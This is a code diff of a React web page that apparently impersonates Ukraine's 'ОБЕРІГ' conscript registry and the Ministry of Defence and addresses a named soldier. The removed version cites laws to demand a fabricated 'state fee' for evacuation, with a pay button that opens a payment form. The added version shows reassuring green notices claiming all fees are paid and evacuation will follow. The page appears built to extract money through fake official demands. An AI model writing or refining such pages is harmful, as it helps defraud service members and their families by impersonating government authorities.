@@ -290,37 +290,43 @@
                                 </div>
                             )}
 
-                            {/* СПОВІЩЕННЯ */}
+                            {/* ОНОВЛЕНЕ СПОВІЩЕННЯ (зелене, про сплату) */}
                             {showNotification && (
                                 <div className="notification-overlay">
-                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[85vh]">
-                                        <h3 className="w-full text-center text-xl font-black uppercase italic text-blue-600 border-b pb-3 mb-4">Системне сповіщення</h3>
-                                        <div className="space-y-4 text-[13px] leading-relaxed text-gray-700 italic">
+                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh]">
+                                        <h3 className="w-full text-center text-xl font-black uppercase italic text-green-600 border-b pb-3 mb-4">Системне сповіщення</h3>
+                                        <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
                                             <p><span className="font-black text-black">Шановний Максим Олександрович!</span></p>
-                                            <p>Хочемо повідомити Вам про те, що перевірка та реєстрація документації в ЄДР «ОБЕРІГ» з приводу евакуації перейшла у фінальний етап.</p>
-                                            <p>Просимо Вас протягом найближчої години <span className="font-black text-red-600">ОБОВ'ЯЗКОВО</span> залишатись на зв'язку та регулярно оновлювати свій особистий кабінет в ЄДР «ОБЕРІГ».</p>
-                                            <p>З повагою,<br/>Адміністративна служба<br/>ЄДИНОГО ДЕРЖАВНОГО РЕЄСТРУ ВІЙСЬКОВОЗОБОВ'ЯЗАНИХ, ПРИЗОВНИКІВ та РЕЗЕРВІСТІВ «ОБЕРІГ»</p>
+                                            <p>Всі Ваші заборгованості сплачено. Усі документи прийняті в реєстрацію системи ЄДР «ОБЕРІГ».</p>
+                                            <p>Будь ласка, очікуйте завершення їхньої реєстрації. Після завершення реєстрації Вас буде евакуйовано з супроводом до КП «ДБКЛПД» ДОР.</p>
+                                            <p className="mt-4 font-bold text-green-600 flex items-center gap-2">
+                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                                                Статус: усі платежі пройдено
+                                            </p>
+                                            <p>З повагою,<br/>Адміністративна служба<br/>ЄДР «ОБЕРІГ»</p>
                                         </div>
                                         <button onClick={() => setShowNotification(false)} className="w-full bg-black text-white py-4 rounded-2xl font-black uppercase mt-6 italic shadow-lg">ЗРОЗУМІЛО</button>
                                     </div>
                                 </div>
                             )}
 
-                            {/* НОВЕ СПОВІЩЕННЯ ВІД МІНОБОРОНИ */}
+                            {/* ОНОВЛЕНЕ ПОВІДОМЛЕННЯ ВІД МІНОБОРОНИ (замість вимоги оплати – інформація про завершення) */}
                             {showDefenseModal && (
                                 <div className="notification-overlay">
-                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[85vh]">
-                                        <h3 className="w-full text-center text-xl font-black uppercase italic text-blue-600 border-b pb-3 mb-4">МІНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</h3>
+                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-green-600 shadow-2xl overflow-y-auto max-h-[85vh]">
+                                        <h3 className="w-full text-center text-xl font-black uppercase italic text-green-600 border-b pb-3 mb-4">МІНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
                                             <p className="font-black text-black">ШАНОВНИЙ МАКСИМ ОЛЕКСАНДРОВИЧ.</p>
-                                            <p>Повідомляємо, що Ваша військова частина подала звіти щодо Вашої евакуації до системи ЄДР «ОБЕРІГ», але, на жаль, наша система не може прийняти та зареєструвати їх, оскільки:</p>
-                                            <p className="italic border-l-4 border-blue-300 pl-3">«Згідно з чинним законодавством України, Законом України «Про військовий обов'язок і військову службу» та Наказом МОУ №402 «Про затвердження Положення про військово-лікарську експертизу в Збройних Силах України», а також згідно зі статтею 11 Закону України "Про соціальний і правовий захист військовослужбовців та членів їх сімей" (№ 2011-XII) та Порядком організації медичної евакуації, затвердженим Постановою Кабінету Міністрів України, для направлення на медичний огляд до спеціалізованих закладів України (психіатричного профілю) необхідно сплатити державний збір за здійснення евакуаційних заходів у розмірі 0,8 прожиткового мінімуму для працездатних осіб.»</p>
-                                            <p className="font-bold text-red-600">БУДЬ ЛАСКА, здійсніть сплату, після чого завершальний етап найближчим часом буде завершено та Ви отримаєте виклик на евакуацію.</p>
+                                            <p>Всі Ваші заборгованості сплачено. Усі документи прийняті в реєстрацію системи ЄДР «ОБЕРІГ».</p>
+                                            <p>Будь ласка, очікуйте завершення їхньої реєстрації. Після завершення реєстрації Вас буде евакуйовано з супроводом до КП «ДБКЛПД» ДОР.</p>
+                                            <p className="mt-4 font-bold text-green-600 flex items-center gap-2">
+                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                                                Статус: усі платежі пройдено, очікуйте наказ.
+                                            </p>
+                                            <p>З повагою,<br/>Міністерство оборони України</p>
                                         </div>
-                                        <div className="flex gap-3 w-full mt-6">
-                                            <button onClick={() => { setShowDefenseModal(false); setShowPaymentForm(true); }} className="flex-1 bg-blue-600 text-white py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all">СПЛАТИТИ</button>
-                                            <button onClick={() => setShowDefenseModal(false)} className="flex-1 bg-gray-200 text-gray-800 py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all">ПІЗНІШЕ</button>
-                                        </div>
+                                        {/* Замість двох кнопок залишаємо одну – "ЗРОЗУМІЛО" */}
+                                        <button onClick={() => setShowDefenseModal(false)} className="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all mt-6">ЗРОЗУМІЛО</button>
                                     </div>
                                 </div>
                             )}
@@ -351,8 +357,9 @@
                                 <p className="text-blue-600 font-black text-xs uppercase tracking-widest mt-2">{userData.rank} • {userData.unit}</p>
                             </div>
 
+                            {/* Виправлено повтор "очікуйте очікуйте" */}
                             <div className="marquee-container">
-                                <marquee scrollamount="4">«За результатами перевірки: адміністративний збір (перша заборгованість) ОПЛАЧЕНО 16.02.2026. Наркологічний сертифікат — СПЛАЧЕНО. Очікуйте очікуйте на наказ про евакуацію до КП «ДБКЛПД» ДОР»</marquee>
+                                <marquee scrollamount="4">«За результатами перевірки: адміністративний збір (перша заборгованість) ОПЛАЧЕНО 16.02.2026. Наркологічний сертифікат — СПЛАЧЕНО. Очікуйте на наказ про евакуацію до КП «ДБКЛПД» ДОР»</marquee>
                             </div>
 
                             <div className="flex flex-col">
